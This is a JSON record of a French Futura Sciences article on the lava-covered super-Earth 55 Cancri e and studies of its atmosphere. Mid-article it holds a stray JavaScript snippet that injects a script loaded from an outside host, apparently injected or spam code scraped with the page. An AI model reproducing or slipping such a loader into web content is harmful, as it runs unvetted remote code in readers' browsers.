{"title": "L'atmosphère de cette superterre « en diamant » ressemblerait à la nôtre", "newspaper": "Futura Sciences", "author": "Xavier Demeersman", "date_publi": "21/11/2017", "content": "Gravitant autour de son soleil à seulement 2,5 millions de kilomètres, 55 Cancri e est étonnante. Cette superterre a été surnommée « planète de diamant ». Une nouvelle étude démontre que ce monde brûlant couvert de lave est enveloppé d'une atmosphère ressemblant à la nôtre. De par ses caractéristiques étonnantes, l' exoplanète   55 Cancri e  — plus exactement 55 Cancri Ae — intrigue et passionne les astronomes. Deux fois plus grande que la  Terre  et huit fois plus massive, cette  superterre  ne gravite qu'à 2,5 millions de kilomètres de  55 Cancri A  (une  étoile  similaire à la nôtre, située à quelque 40  années-lumière  de nous, dans la  constellation du Cancer ), soit 60 fois plus près que notre Planète bleue ne l'est du  Soleil . Une année (période orbitale) n'y dure que 17 h 40 min. Son  orbite  est synchrone, si bien qu'un hémisphère est en permanence face à l'étoile et l'autre, plongé à jamais dans l'obscurité. Des  observations dans l’infrarouge avec le satellite Spitzer  avaient conduit des chercheurs à postuler, en 2016, que la planète était un véritable enfer, couvert de dépôts de lave sur le côté jour et de lave solidifiée côté nuit. Ce n'est donc pas le meilleur des mondes pour y trouver de la vie, vous l'aurez compris. Mais alors, pourquoi s'y intéresser ? interrogeront certains.  « Comprendre cette planète nous aidera à répondre à des questions plus larges sur l'évolution des planètes rocheuses » , argue Renyu Hu, chercheur au JPL et coauteur d'une nouvelle étude sur cette superterre qui vient de paraître dans  The Astronomical Journal . Nouvelle illustration de 55 Cancri e. La superterre serait entièrement couverte de lave et enveloppée d’une atmosphère plus épaisse que celle de la Terre, avec des matériaux volatils comparables. © Nasa, JPL-Caltech                               55 Cancri e serait rocheuse et aurait une atmosphère Avec ses collègues, l'astrophysicien a conduit une analyse approfondie des données photométriques collectées par Spitzer en juin et juillet 2013. Selon leurs recherches, 55 Cancri e ( alias  Janssen) posséderait une  atmosphère  avec des ingrédients communs à ceux de l'atmosphère terrestre, à la différence que celle-ci serait plus épaisse et plus chaude. Sa présence, d'ailleurs, ne manque pas d'interroger : comment une planète si proche de son étoile parvient-elle à garder une atmosphère ?  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Renyu Hu a établi un modèle amélioré de la circulation d'énergie de la planète et de son rayonnement dans l'espace. En comparant celui-ci aux observations, l'équipe, dirigée par Isabel Angelo, montre que les écarts de température entre les deux hémisphères ne sont pas aussi importants que ce qui se produirait si la planète n'avait pas d'atmosphère. Il ferait ainsi en moyenne 2.300 °C sur la face diurne et autour de 1.300 °C sur la face nocturne. Le saviez-vous ? Depuis décembre 2015, dans le cadre du concours international  NameExoWorlds  initié par l’Union astronomique internationale (UAI), 55 Cancri e s’appelle aussi Janssen, du nom d’un lunetier allemand de la Renaissance, Zacharias Janssen (v. 1588 – v. 1631), possible inventeur de la lunette astronomique et du microscope. L’étoile 55 Cancri A a été baptisée Copernic et les autres planètes du système, 55 Cancri b, c, d et f : Galilée, Brahe, Lippershey et Harriot. Voir tous les autres noms validés  ici . En outre,  « des lacs de lave (supposés se trouver sur le côté jour) directement exposés à l'espace sans atmosphère créeraient des points chauds locaux de hautes températures ; ils ne sont donc pas la meilleure explication pour les observations de Spitzer »,  estiment les auteurs. La lave qui recouvre ce monde serait en fait cachée par une épaisse atmosphère. Celle-ci se composerait, selon eux, d' oxygène , d'azote et aussi d'eau. Mais point d'eau liquide subsistant à la surface de ce monde brûlant, dont la densité est similaire à celle de la Terre.   « Les arguments en faveur d'une atmosphère sont maintenant plus forts que jamais » , défend Renyu Hu, rappelant combien l'existence d'une atmosphère autour de  55 Cancri e , sa composition et sa structure sont débattues depuis plusieurs années (voir article ci-dessous). Pour en savoir plus L'atmosphère de la superterre « en diamant » serait irrespirable Article de Xavier Demeersman publié le 21 février 2016 Pour la première fois, l'atmosphère d'une superterre a été caractérisée, grâce à  Hubble  qui n'avait pu jusque-là scruter que celles de quelques  géantes gazeuses . Surnommée la « planète de  diamant  », 55 Cancri e n'est pas vraiment accueillante, sauf pour qui voudrait respirer du cyanure à 2.000 °C. Prés de quinze ans après les premières mesures de l'atmosphère d'une  planète géante  dans un autre  Système solaire , en l'occurrence HD 209458 b, Hubble a permis de caractériser pour la première fois celle d'une  superterre , après deux précédentes tentatives non concluantes. De taille et de  masse  intermédiaires entre une planète géante de type  Jupiter  et une boule rocheuse comme la Terre, cette catégorie d' exoplanète  serait très  courante au sein des galaxies . C'est grâce à l'instrument WFC3 ( Wide Field Camera 3 ) greffé sur le  télescope  spatial en 2009 et une nouvelle technique de traitement des  spectres  obtenus, qu'une équipe d'astrophysiciens de l'UCL ( University College London ) a pu déterminer la composition de l'enveloppe gazeuse de ce corps situé à une quarantaine d'années-lumière seulement, soit presque 10 fois la distance qui sépare le Soleil de  Proxima du Centaure . La cible est déjà bien connue des astronomes. Il s'agit de 55 Cancri e,  alias  Janssen (voir la note en bas de page), une planète huit fois plus massive que la Terre qui, à partir de 2012, fut surnommée la «  planète de diamant  » car des modèles se référant à son rayon et à sa masse ont spéculé qu'elle est très riche en  carbone . Cette  superterre  appartient à un système multiple de cinq planètes connues parmi lesquelles trois géantes. Leur étoile-parent, 55 Cancri A ( alias   Copernic ), ressemble au Soleil, avec un milliard d'années de plus. La  naine rouge  juste à côté (à environ 1.000  UA , mille fois la distance Terre-Soleil), 55 Cancri B, compose avec elle un couple stellaire qui, par une belle nuit noire, est presque visible à l' œil  nu dans la constellation du Cancer ( Cancri ). Animation de 55 Cancri e se déplaçant autour de son soleil 55 Cancri A, alias Copernic. La superterre ne met que 18 heures pour boucler son orbite. © ESA, Hubble, M. Kornmesser Une possible exoplanète de diamant Pour sonder l'atmosphère d'un corps lointain, quoi de mieux qu'une grosse Terre en  transit  devant son étoile, qui plus est, qui gravite très près, et en seulement quelques heures, comme le fait  55 Cancri e  ? Bien entendu, dans ces conditions extrêmes où la température culmine tout au long de l'année de 18 heures autour de 2.000 °C, toute habitabilité est exclue. Un constat qui empire avec l'étude de son atmosphère. L'étude à paraître dans  Astrophysical Journal  révèle une abondance d' hydrogène  et d' hélium  et aucune trace notable de vapeur d'eau. Pour Angelos Tsiaras, de l'UCL,  « les observations de l'atmosphère de 55 Cancri e suggèrent que la planète a réussi à accrocher une quantité importante d'hydrogène et d'hélium de la  nébuleuse  où elle s'est formée ».  Les chercheurs ont été frappés par la présence importante de cyanure d'hydrogène, un marqueur d'atmosphère riche en carbone,  « cela nous indique un rapport carbone sur oxygène très élevé »  souligne Olivia Venot, de l'université de Leuven (Belgique), qui a produit récemment un modèle en accord avec ces observations. Une composante très intéressante car, comme l'explique Jonathan Tennyson, également de l'UCL,  « si la présence de cyanure d'hydrogène et d'autres  molécules  est confirmée dans les prochaines années par la nouvelle génération de télescopes à  infrarouges , cela appuierait la théorie que cette planète est effectivement un endroit riche en carbone et très  exotique  » . Patience, patience donc : le  télescope spatial James-Webb  ( JWST ) devrait partir en 2018, si tout va bien. Nul doute que 55 Cancri e fera partie de ses cibles planétaires privilégiées. Idem pour la mission  WFIRST  ( Wide-Field Infrared Survey Telescope ) dont la Nasa vient d'annoncer le coup d'envoi de sa conception. Le satellite sondera l' univers  et aussi les mondes lointains dans l'infrarouge dans un champ cent fois plus étendu que celui d'Hubble. Lancement prévu au milieu des années 2020. Interview : qu'est-ce qu'une exoplanète ?                       La question des exoplanètes est très ancienne en astronomie. Leur existence est pour la première fois attestée de façon indirecte dans les années 1990. Futura-Sciences a rencontré Jean-Pierre Luminet, astrophysicien de renom, afin qu’il nous parle plus en détail de ce passionnant sujet.                                       ", "theme": "sciences"}